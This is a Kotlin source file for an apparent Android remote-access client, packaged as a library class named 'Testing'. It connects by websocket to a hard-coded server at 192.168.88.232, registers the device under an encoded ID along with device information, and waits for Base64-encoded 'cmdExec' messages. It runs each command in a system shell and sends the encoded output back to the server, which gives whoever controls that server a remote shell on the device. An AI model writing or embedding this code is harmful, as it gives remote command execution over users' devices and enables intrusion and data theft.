package com.icerockdev.library

import dev.icerock.moko.socket.Socket
import dev.icerock.moko.socket.SocketEvent
import dev.icerock.moko.socket.SocketOptions
import kotlinx.serialization.json.JsonArray
import kotlinx.serialization.json.JsonObject
import org.json.JSONArray
import org.json.JSONObject
import org.json.JSONTokener
import java.io.BufferedReader
import com.jaredrummler.ktsh.Shell
import java.io.IOException
import java.io.InputStreamReader
import kotlin.system.exitProcess
import java.util.Base64

class Testing {
    lateinit var self: String
    lateinit var info: String
    val socket = Socket(
        endpoint = "http://192.168.88.232:80/",
        config = SocketOptions(
            queryParams = null,
            transport = SocketOptions.Transport.WEBSOCKET
        )
    ) {
        on(SocketEvent.Connect) {
            println("connected")
            login()
        }

        on(SocketEvent.Connecting) {
            println("connecting")
        }

        on(SocketEvent.Disconnect) {
            println("disconnect")
        }

        on(SocketEvent.Error) {
            println("error $it")
        }

        on(SocketEvent.Reconnect) {
            println("reconnect")
        }

        on(SocketEvent.Message) {
            println("Got Message")
            var data = toString()
            println(data.toString())
        }

        on(SocketEvent.ReconnectAttempt) {
            println("reconnect attempt $it")
        }

        on(SocketEvent.Ping) {
            println("ping")
        }

        on(SocketEvent.Pong) {
            println("pong")
        }

        listOf(
            "cmdExec",
            "pingingAllClients"
        ).forEach { eventName ->
            on(eventName) { data ->
                if ("$eventName" != "pingingAllClients") {
                    val jsonObject = JSONTokener("$data").nextValue() as JSONObject
                    val cmd = fb64(jsonObject.getString("cmd"))
                    val uid = jsonObject.getString("uid")
                    println("$eventName")
                    println("$cmd $uid")
                    if ("$uid" == "$self") {
                        if ("$eventName" == "cmdExec") {
                            if ("$cmd" == "systeminfo"){
                                returnInfo()
                            }
                            cmd("$cmd")
                        }
                    }
                }else{
                    ping()
                }
            }
        }
    }

    private fun tb64(string:String):String{
        // encode a string using Base64 encoder
        val encoder: Base64.Encoder = Base64.getEncoder()
        val encoded: String = encoder.encodeToString(string.toByteArray())
        println("Encoded Data: $encoded")
        return "$encoded"
    }
    private fun fb64(input:String): String{
        // decode the encoded data
        val decoded: String = String(Base64.getDecoder().decode(input))
        println("Decoded Data: $decoded")
        return "$decoded"
    }
    private fun ping(){
        val pong: String = tb64("pong")
        val data = JSONObject("""{"cmd":"pong", "uid":"$self"}""")
        socket.emit("droidClient", data.toString())
    }
    private fun returnInfo(){
        val data = JSONObject("""{"cmd":"$info", "uid":"$self"}""")
        socket.emit("returnDData", data.toString())
    }
    private fun login() {
        val info = JSONObject("""{"info":"$info", "uid":"$self"}""")
        println(info)
        socket.emit("initDroid", info.toString())
        val _1: String = tb64("hello")
        val data = JSONObject("""{"cmd":"$_1", "uid":"$self"}""")
        println(data)
        socket.emit("droidClient", data.toString())
    }

    fun setSelf(deviceId: String, infoString: String){
        println("DeviceID: $deviceId")
        println("DeviceInfo: $infoString")
        self = tb64("droid_$deviceId")
        info = tb64(infoString)
    }

    private val shell = Shell.SH
    fun cmd(input: String) {
        val result: Shell.Command.Result = shell.run(input)
        var output: String = ""
        println(result)
        shell.addOnStdoutLineListener(object : Shell.OnLineListener {
            override fun onLine(line: String) {
                output = "$line"
                println("$output")
                val out:String = tb64(output)
                val data = JSONObject("""{"cmd":"$out", "uid":"$self"}""")
                socket.emit("returnDData", data.toString())
            }
        })
    }
}

